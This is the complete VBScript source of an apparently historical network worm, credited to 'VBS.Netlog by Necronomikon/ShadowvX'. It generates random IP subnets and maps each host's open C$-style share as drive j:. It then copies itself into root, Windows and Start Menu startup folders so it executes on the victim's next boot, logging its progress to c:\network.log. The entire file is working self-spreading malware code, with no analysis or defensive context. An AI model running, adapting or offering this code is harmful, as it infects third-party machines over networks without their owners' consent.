dim octa
dim octb
dim octc
dim octd
dim rand
dim dot
dim driveconnected
dim sharename
dim count
dim myfile
count = "0"
dot = "."
driveconnected="0"
set wshnetwork = wscript.createobject("wscript.network")
Set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
on error resume next
rem VBS.Netlog by Necronomikon/ShadowvX
randomize
checkfile()
randaddress()

do
do while driveconnected = "0"
checkaddress()
shareformat()
wshnetwork.mapnetworkdrive "j:", sharename
enumdrives()
loop
copyfiles()
disconnectdrive()
loop

msgbox "Done"

function disconnectdrive()
wshnetwork.removenetworkdrive "j:"
driveconnected = "0"
end function

function createlogfile()
Set myfile = fso1.createtextfile("c:\network.log", True)
end function

function checkfile()
If (fso1.fileexists("c:\network.log")) then
fso1.deletefile("c:\network.log")
createlogfile()
else
createlogfile()
end If
myfile.writeLine("Log file Open")
end function

function copyfiles()
myfile.writeline("Copying files to  :  " & sharename)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\network.vbs", "j:\"

If (fso2.FileExists("j:\network.vbs")) Then
myfile.writeline("Successfull copy to  :  " & sharename)
End If  

fso.copyfile "c:\network.vbs", "j:\windows\startm~1\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\windows\"

fso.copyfile "c:\network.vbs", "j:\windows\start menu\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\win95\start menu\programs\startup\"

fso.copyfile "c:\network.vbs", "j:\win95\startm~1\progra~1\startup\"

fso.copyfile "c:\network.vbs", "j:\wind95\"

end function

function checkaddress()
octd = octd + 1
if octd = "255" then randaddress()
end function

function shareformat()
sharename = "\\" & octa & dot & octb & dot & octc & dot & octd & "\C"
end function

function enumdrives()
Set odrives = wshnetwork.enumnetworkdrives
For i = 0 to odrives.Count -1
if sharename = odrives.item(i) then
driveconnected = 1
else
' driveconnected = 0 
end if
Next
end function

function randum()
rand = int((254 * rnd) + 1)
end function

function randaddress()
if count < 50 then
octa=Int((16) * Rnd + 199)
count=count + 1
else
randum()
octa= rand
end if
randum()
octb=rand
randum()
octc=rand
octd="1"
myfile.writeLine("Subnet  :  " & octa & dot & octb & dot & octc & dot & "0")
end function
